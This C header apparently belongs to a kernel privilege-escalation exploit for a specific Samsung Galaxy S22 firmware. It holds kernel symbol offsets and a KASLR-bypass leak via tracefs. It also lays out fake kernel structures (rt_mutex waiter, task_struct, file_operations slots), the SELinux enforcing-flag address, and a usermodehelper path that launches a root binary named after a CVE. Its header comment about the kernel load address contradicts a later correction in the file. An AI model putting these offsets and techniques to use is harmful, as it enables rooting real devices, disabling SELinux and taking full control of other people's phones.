#ifndef OFFSET_H
#define OFFSET_H

/*
 * Samsung Galaxy S22 (SM-S901U, r0q/taro) — S901USQU2BVK1
 * Android 13, kernel 5.10.81-android12-9.
 *
 * All symbol offsets extracted from the stock BVK1 vmlinux.  Structural
 * (non-symbol) offsets shared with the S901WVLS4DWL3 v5.10 port.
 *
 * BVK1-specific notes:
 *   - Kernel physical load address is 0x80080000 (NOT the 0xa8000000 used
 *     by DWL3/GZF3+).  Verified empirically: runtime direct-map aliases of
 *     init_task/root_task_group/sysctl_bootid are stable across boots and
 *     give image_phys = 0x80080000 on every attempt.
 *   - KASLR is page-granular (4K), coarse units of 2MB + fine mul>>21 term
 *     in kaslr_early_init; slide computed via tracefs event 84 caller leak.
 *   - __arm64_compat_sys_setsockopt is an ENOSYS stub => exp64 route only.
 */

#define BUILD_VARIANT_LABEL "r0q_taro_v5.10_S901USQU2BVK1"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "samsung/r0qcsx/r0q:13/TP1A.220624.014/S901USQU2BVK1:user/release-keys"
#endif

/* ---- Kernel image layout ---- */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* 39-bit VA PAGE_OFFSET     */
#define P0_PHYS_OFFSET   0x80000000ULL           /* memstart_addr             */
/* DEVICE-VERIFIED via alias probe (2026-08-23): *ashmem_misc.fops readback
 * matches ONLY with phys load 0xa8000000 + slide — same as DWL3/GZF3.
 * The earlier 0x80080000 claim was formula-derived and wrong. */
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL   /* 64GB direct map */
#define DIRECT_MAP_BASE  0xffffff8000000000ULL
#define DIRECT_MAP_END   0xffffff9000000000ULL
#define VMEMMAP_START    0xfffffffeffe00000ULL   /* 39-bit v5.10 */

/* ---- ashmem dispatch functions ---- */
#define ASHMEM_MISC_FOPS_OFF 0x02709fc0ULL   /* &ashmem_misc.fops (ashmem_misc+0x10) */
#define ASHMEM_FOPS_OFF      0x02055898ULL   /* &ashmem_fops           */

#define ASHMEM_IOCTL_OFF         0x011ddff8ULL   /* ashmem_ioctl           */
#define ASHMEM_COMPAT_IOCTL_OFF  0x011defc8ULL   /* compat_ashmem_ioctl    */
#define ASHMEM_MMAP_OFF          0x011df020ULL   /* ashmem_mmap            */
#define ASHMEM_OPEN_OFF          0x011df32cULL   /* ashmem_open            */
#define ASHMEM_RELEASE_OFF       0x011df3c4ULL   /* ashmem_release         */
#define ASHMEM_SHOW_FDINFO_OFF   0x011df5acULL   /* ashmem_show_fdinfo     */

/*
 * configfs — v5.10 uses old .read/.write API.
 * .read slot MUST be configfs_read_file; .write slot MUST be
 * configfs_write_bin_file (see S901WVLS4DWL3 notes).
 */
#define CONFIGFS_READ_ITER_OFF      0x0065bdf4ULL   /* configfs_read_file      */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0065c99cULL   /* configfs_write_bin_file */

#define COPY_SPLICE_READ_OFF  0x0055d8fcULL   /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF       0x004e396cULL   /* noop_llseek              */

/* ---- Kernel data objects ---- */
#define INIT_TASK_OFF           0x025bbf00ULL   /* init_task           */
#define ROOT_TASK_GROUP_OFF     0x027bb040ULL   /* root_task_group     */
/* Runtime enforce flag = selinux_state.enforcing @ +0x00
 * (selinux_state @ 0xffffffc00a8eca20).  NOT selinux_enforcing_boot. */
#define SELINUX_ENFORCING_OFF   0x028eca20ULL   /* selinux_state.enforcing */
#define KMALLOC_CACHES_OFF      0x02097658ULL   /* kmalloc_caches      */
#define ANON_PIPE_BUF_OPS_OFF   0x01edd528ULL   /* anon_pipe_buf_ops   */

/* ---- Convenience macros (absolute addresses) ---- */
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER       (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ   (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK        (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---- Root usermodehelper ---- */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x0010c2d0ULL   /* &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
#define SYSTEM_UNBOUND_WQ_OFF 0x025a9e00ULL               /* &system_unbound_wq - KIMAGE_TEXT_BASE */

/* ---- kCFI canonical (.cfi_jt) addresses ----
 * Same policy as DWL3/GZF3: jump-table entries match the raw symbol
 * addresses for these functions on this firmware family. */
#define ASHMEM_IOCTL_JT_OFF           0x011ddff8ULL
#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x011defc8ULL
#define ASHMEM_MMAP_JT_OFF            0x011df020ULL
#define ASHMEM_OPEN_JT_OFF            0x011df32cULL
#define ASHMEM_RELEASE_JT_OFF         0x011df3c4ULL
#define ASHMEM_SHOW_FDINFO_JT_OFF     0x011df5acULL
#define ASHMEM_LLSEEK_JT_OFF          0x011ddb9cULL   /* real table .llseek (ashmem_llseek) */
#define CONFIGFS_READ_FILE_JT_OFF       0x0065bdf4ULL
#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x0065c99cULL
#define NOOP_LLSEEK_JT_OFF            0x004e396cULL
#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x0010c2d0ULL

#define ASHMEM_IOCTL_JT        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_JT_OFF)
#define ASHMEM_COMPAT_IOCTL_JT (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_JT_OFF)
#define ASHMEM_MMAP_JT         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_JT_OFF)
#define ASHMEM_OPEN_JT         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_JT_OFF)
#define ASHMEM_RELEASE_JT      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_JT_OFF)
#define ASHMEM_SHOW_FDINFO_JT  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_JT_OFF)
#define ASHMEM_LLSEEK_JT       (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_JT_OFF)
#define CONFIGFS_READ_FILE_JT       (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_JT_OFF)
#define CONFIGFS_WRITE_BIN_FILE_JT  (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_JT_OFF)
#define NOOP_LLSEEK_JT         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_JT_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK_JT \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_JT_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ---- SKB delta ----
 * BVK1 unix_stream_sendmsg geometry matches DWL3/GZF3:
 * per-skb cap 36480 B = 0xe80 linear head + one 32KB order-3 frag page;
 * payload pointers biased by -0xe80.  Also independently derived for BVK1
 * from a live capture event (dance write at block+0x800 surfaced at content
 * offset 0x1680). */
#ifndef SKB_DATA_DELTA
#define SKB_DATA_DELTA (-0xe80LL)
#endif

/* ---- SLIDE KASLR bypass offsets ---- */
#define SLIDE_FAKE_WAITER_PRIO   0
#define SLIDE_WAITER_WAKE_STATE  0
#define SLIDE_LOCK_OWNER_VALUE   1ULL
#define SLIDE_USE_FAKE_TASK      1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 84

#define SLIDE_NFULNL_LOGGER_OFF        0x025b13a0ULL
#define SLIDE_LOGGERS_0_1_OFF          0x025b12d0ULL   /* &loggers[0][1] = nfulnl_logger - 0xd0 */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x026ca978ULL   /* &random_table[4].data */
#define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF        0x0298b984ULL   /* sysctl_bootid buffer */

#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/*
 * TraceFS worker caller offset — return address after worker_thread's
 * bl schedule, BVK1-specific (device-verified across dozens of boots:
 * unanimous votes every boot).
 */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x001185f8ULL

/* ---- Fake page layout offsets (within the 32KB order-3 kernel page) ---- */
#define LOCK_OFF    0x1350
#define W0_OFF      0x2220
#define FOPS_OFF    0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF   0x4440
#define LEFT_OFF    0x5550
#define FAKE_TASK_OFF 0x3200

/* ---- rt_mutex_waiter embedded offsets (v5.10) ---- */
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68

/* ---- task_struct internal offsets (v5.10; usage/prio byte-verified vs BVK1 init_task) ---- */
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x84
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c
#define FAKE_TASK_TASK_GROUP_OFF    0x310
#define FAKE_TASK_PI_LOCK_OFF       0x86c
#define FAKE_TASK_PI_WAITERS_OFF    0x880
#define FAKE_TASK_PI_TOP_TASK_OFF   0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898

/* ---- configfs buffer-private overlay offsets ---- */
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

/* ---- workqueue_struct (v5.10) ---- */
#define WQ_DFL_PWQ_OFF 0xb0

/* ---- pool_workqueue offsets (v5.10, sizeof=256) ---- */
#define PWQ_POOL_OFF         0x00
#define PWQ_WQ_OFF           0x08
#define PWQ_WORK_COLOR_OFF   0x10
#define PWQ_REFCNT_OFF       0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF    0x58
#define PWQ_MAX_ACTIVE_OFF   0x5c

/* ---- worker_pool offsets (v5.10, sizeof=896) ---- */
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF  0x34

/* ---- work_struct offsets (v5.10, sizeof=48) ---- */
#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

/* ---- struct page (v5.10, sizeof=64) ---- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- pipe buffer ---- */
#define PIPE_BUFFER_SLOTS         32
#define PIPE_BUF_FLAG_CAN_MERGE   0x10

/* ---- file_operations offsets (v5.10, sizeof=288=0x120) ---- */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xC8
#define FOPS_SHOW_FDINFO_OFF  0xE0

/* ---- v5.10 struct size overrides ---- */
#define MM_STRUCT_SZ       960
#define MM_CPU_PARTIAL     13
#define KSNITCH_COLLISIONS 6

#endif
